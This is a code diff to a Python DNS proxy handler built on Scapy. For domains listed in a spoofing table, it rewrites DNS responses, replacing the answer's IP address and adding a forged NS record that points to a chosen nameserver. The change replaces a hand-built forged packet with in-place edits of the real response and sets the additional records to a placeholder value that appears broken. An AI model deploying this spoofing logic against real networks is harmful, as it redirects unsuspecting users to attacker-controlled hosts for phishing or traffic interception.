@@ -42,18 +42,15 @@ def handler(data, addr, socket, dns_ip):
         if (int(rcode, 16) == 1):
             print "Format Error: Request is not a DNS query"
         else:
-            original_dns_packet = IP(server_response)/UDP(server_response)/DNS(server_response)
+            original_dns_packet = IP(server_response[2:])/UDP(server_response[2:])/DNS(server_response[2:])
             url = original_dns_packet[DNS].qd.qname
             if url in to_be_spoofed:
                 print "Request for %s will be spoofed" % url[:-1]
                 print "Original\n", original_dns_packet.show()
-                spoofed_dns_packet = IP(dst=original_dns_packet[IP].dst, src=original_dns_packet[IP].src, id=original_dns_packet[DNS].id) /\
-                    UDP(dport=original_dns_packet[UDP].dport, sport=original_dns_packet[UDP].sport) /\
-                    DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
-                    nscount=1, arcount=0, ancount=1, qdcount=1,
-                    an=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=original_dns_packet[DNS].an.ttl,rdata=to_be_spoofed[url]['ipv4']),
-                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']),
-                    ar=DNSRR(rrname=to_be_spoofed[url]['ns'], type='A', ttl=1360, rdata='1.1.1.1'))
+                spoofed_dns_packet = original_dns_packet
+                original_dns_packet[DNS].an.rdata = to_be_spoofed[url]['ipv4']
+                original_dns_packet[DNS].ar = NotImplemented
+                original_dns_packet[DNS].ns = DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns'])
                 print "Spoofed packet", spoofed_dns_packet.show()
                 proxy_response = bytes(spoofed_dns_packet)
             else:
